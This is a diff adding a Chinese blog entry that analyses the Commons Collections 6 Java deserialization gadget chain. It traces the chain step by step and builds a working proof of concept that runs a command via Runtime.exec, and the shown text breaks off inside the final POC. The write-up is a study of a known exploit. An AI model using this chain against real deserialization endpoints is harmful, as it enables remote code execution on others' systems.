@@ -3014,4 +3014,240 @@
         <tag>python</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CommonCollections6利用链分析</title>
+    <url>/2023/07/26/cc6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>cc6有点像我们前面分析的cc1和urldns利用链的结合，cc6的前半部分是urldns，后半部分是cc1。所以分析完cc1和urldns这条链还是相对简单一点的。</p>
+<p>我们前面在分析cc1的时候环境jdk版本要低于8u71,当jdk版本高于8u71之后<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法逻辑就发生了改变，不能够再利用，而cc6就是一个可以在高版本利用的cc链。</p>
+<h1 id="二、cc6利用链分析"><a href="#二、cc6利用链分析" class="headerlink" title="二、cc6利用链分析"></a>二、cc6利用链分析</h1><p>我们先看一下cc6的利用链：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> java.io.ObjectInputStream.readObject()</span><br><span class="line">    java.util.HashMap.readObject()</span><br><span class="line">        java.util.HashMap.hash()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line"> org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line"> java.lang.reflect.Method.invoke()</span><br><span class="line"> java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以看到这条链的从漏洞点到LazyMap的get函数和我们cc1的后半部分是一样的。只不过在cc1中我们是通过AnnotationInvocationHandler类中的invoke方法去调用LazyMap类中的get方法，然后在通过动态代理最终实现了整条攻击链的利用。</p>
+<p>但是我们前面也说了在jdk版本8u71之后<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法逻辑就发生了改变，所以这条攻击链就不能在利用了。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这就是我们cc1的后半部分利用链，那我们在cc6这里可以直接利用</p>
+<h2 id="cc1的回顾"><a href="#cc1的回顾" class="headerlink" title="cc1的回顾"></a>cc1的回顾</h2><p>这里回顾一下cc1，对cc6的后半部分利用链做一个简单的分析</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726103246711.png"
+                      alt="image-20230726103246711"
+                ></p>
+<p>我们前面在cc1中讲过，漏洞的利用点就是这个InvokerTransformer类中的transform方法，这里的transform方法可以通过类似与反射的方式获取方法并执行。</p>
+<p>我们在cc1中通过invokerTransform获取到exec方法执行我们的命令还有获取Runtime对象</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class,&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>
+
+<p>分析这个代码我们可以知道这就是transform的循环调用，为了避免传参时要把这几个类都要传进去，我们这里使用了ChainedTransformer()类来简化这个过程</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure></div>
+
+<p>然后后面就是找哪里调用了transform方法</p>
+<p>在我们前面的分析中，我们用的是Lazymap中的get方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    // create value for key if key is not currently in the map</span><br><span class="line">    if (map.containsKey(key) == false) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>到这里为止是cc6和cc1相同的部分，我们这里不具体分析，只是做一个简单的回顾和概述。</p>
+<h2 id="cc6的分析"><a href="#cc6的分析" class="headerlink" title="cc6的分析"></a>cc6的分析</h2><p>我们这里正式开始对cc6的分析</p>
+<p>由于后半部分和cc1是一样的，我们这里直接从Lazymap的get方法开始分析</p>
+<p>在get方法里面是factory调用了transform方法</p>
+<p>那我们这里想要利用就要先看一下factory是否可控</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected LazyMap(Map map, Transformer factory) &#123;</span><br><span class="line">    super(map);</span><br><span class="line">    if (factory == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;Factory must not be null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以看到在LazyMap的构造方法中，接收了factory参数，但是这个构造方法是一个受保护的方法，我们不能直接调用</p>
+<p>继续向上找看有没有可以利用的方法</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726110202757.png"
+                      alt="image-20230726110202757" style="zoom:200%;" 
+                >
+
+<p>存在一个静态方法decorate，接收两个参数一个map对象和一个factory，并返回一个LazyMap对象</p>
+<p>那我们可以通过调用decorate方法控制factoy的值</p>
+<p>这里可以发现其实和我们cc1中的也是一样的</p>
+<p>根据上面的分析我们可以构造paylaod：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">         HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br></pre></td></tr></table></figure></div>
+
+<p>同样的要想利用链能够走下去，我们最终要找到readobject方法</p>
+<p>我们这里要先找一下哪里调用了get方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726113524854.png"
+                      alt="image-20230726113524854"
+                ></p>
+<p>我们这里利用的是TiedMapEntry类中的getvalue方法</p>
+<p>跟进到getvalue方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>而且map是可控的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="hashmap（方法一）"><a href="#hashmap（方法一）" class="headerlink" title="hashmap（方法一）"></a>hashmap（方法一）</h3><p>然后我们可以在hashcode中找到对getvalue的调用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    Object value = getValue();</span><br><span class="line">    return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">           (value == null ? 0 : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那我们可以继续构造我们的POC:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">         HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里我们通过hashcode可以触发getvalue进行触发get方法</p>
+<p>那么我们后面就是继续找哪里调用了hashcode</p>
+<p>关于hashcode我们在urldns中是通过hashmap反序列化时候其<code>readObject()</code>函数会循环每一个键值对放入到HashMap中，而在放入每一个键值对的时候会计算hash（key）值，从而触发<code>key.hashCode()</code>方法，我们在cc6同样可以继续使用这个利用链,进而触发我们后面的漏洞方法：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">          <span class="comment">///******中间代码省略</span></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到在反序列化时会遍历每一个键值对，将其放入到hashmap中，但是这个过程每次都会调用到hash(key)方法，我们跟进到hash方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726151141806.png"
+                      alt="image-20230726151141806"
+                ></p>
+<p>hash方法会对传进来的key值进行判断是否为空，我们只许让key值不为空我们就能触发到hashcode方法</p>
+<p>然后我们这里可以看到触发hashcode的时key值</p>
+<p>那么我们只需要让传进来的key值为我们前面构造的TiedMapEntry对象就可以触发到TiedMapEntry类里面的hashcode方法，那我们整条链子就可以连起来了。</p>
+<p>那么根据我们上面的分析我们可以构造出来我们的利用链POC：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;ccz&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;cc&quot;</span>);</span><br><span class="line">        &#125;    </span><br></pre></td></tr></table></figure></div>
+
+<p>但是现在出现了一个问题，我们现在这里并没有进行反序列化但是这条链子就已经会弹出来计算器了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726152001706.png"
+                      alt="image-20230726152001706"
+                ></p>
+<p>出现的这个问题的原因和我们在分析urldns时触发了两次dns解析的原因是一样的：</p>
+<p>我们在使用hash.put输入键值对时就会触发一次hash方法，我们这里可以跟进put方法看一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726152332245.png"
+                      alt="image-20230726152332245"
+                ></p>
+<p>在我们调用put方法的时候也会调用hash方法进而触发了我们后面的利用链：</p>
+<p>当然解决这个问题的方法也很简单：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br></pre></td></tr></table></figure></div>
+
+<p>我们只用将这里的我们构造的chainTransformer对象先替换掉，让利用链到Lazymap的get方法时先断开，避免在使用put方法时触发利用链。</p>
+<p>修改POC：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;ccz&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;cc&quot;</span>);</span><br><span class="line">        &#125;    </span><br></pre></td></tr></table></figure></div>
+
+<p>我们这里使用的还是这个ConstantTransformer方法，这个方法我们在cc1解决setvlaue值不可控的时候用过，我们通过这个方法使得无论接收什么，都会将我们构造的虚拟机对象返回。</p>
+<p>我们这里同样使用这个方法，当然这个地方其他方法也可以，我们最终的目的只是让利用链断开，无法执行到我们后面的transform方法。</p>
+<p>但是我们后期还是要执行这个利用链，所以我们后面在执行完hashmap.put之后要将我们构造的chainTransformer对象重新传进去，使整个利用链能够到transform方法执行命令。</p>
+<p>我们这里可以通过反射机制通过获取和设置类的私有字段来修改<code>LazyMap</code>对象的<code>factory</code>字段，为我们构造的chainTransformer对象即可。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = LazyMap.class;</span><br><span class="line">Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">factory.setAccessible(true);</span><br><span class="line">factory.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure></div>
+
+<p>那么整体的POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ccz&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;cc&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是我们这里运行之后发现并没有执行我们调用计算器程序的命令。</p>
+<p>我们在<code>hashMap.put(tiedMapEntry,&quot;cc&quot;);</code>打上断点进行调试：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726154314171.png"
+                      alt="image-20230726154314171"
+                ></p>
+<p>步入，跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726154503873.png"
+                      alt="image-20230726154503873"
+                ></p>
+<p>当我们跟进到LazyMap的get方法时可以看到这里：</p>
+<p>这里的containsKey(key)会检测key是否存在map中，这里的map也就是我们上面定义的hashmap对象map</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br></pre></td></tr></table></figure></div>
+
+<p>然后这里我们上面是没有往里面放任何数据的所以这里会返回false</p>
+<p>进而触发了第一次</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">factory.transform(key);</span><br></pre></td></tr></table></figure></div>
+
+<p>但是这里的<code>map.put(key, value);</code>会将key值添加到map中</p>
+<p>那么现在就出现一个个问题在我们进行反序列化时利用链走到这个if判断时，由于map中存在这个key值，导致<code>map.containsKey(key)</code>返回值为true，导致无法触发到<code>factory.transform(key);</code>方法，进而无法执行到后面的利用链进行命令执行。</p>
+<p>这也就是我们刚才反序列化为什么不能够执行调用计算器程序命令的原因，我们的利用链走到这个get方法就断掉了，导致后续利用无法进行。</p>
+<p>那么解决这个问题的方法也很简单，既然存在了这个key值，导致<code>map.containsKey(key)</code>返回值为true，那我们这里把这个key值删掉就行了，使其返回值为false进行触发到<code>factory.transform(key);</code></p>
+<p>我们这里直接使用remove就可以删除了。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lazyMap.remove(&quot;ceshi&quot;);</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><p>那么根据我们上面的分析我们可以构造出最终的POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;cc&quot;);</span><br><span class="line">        lazyMap.remove(&quot;ceshi&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        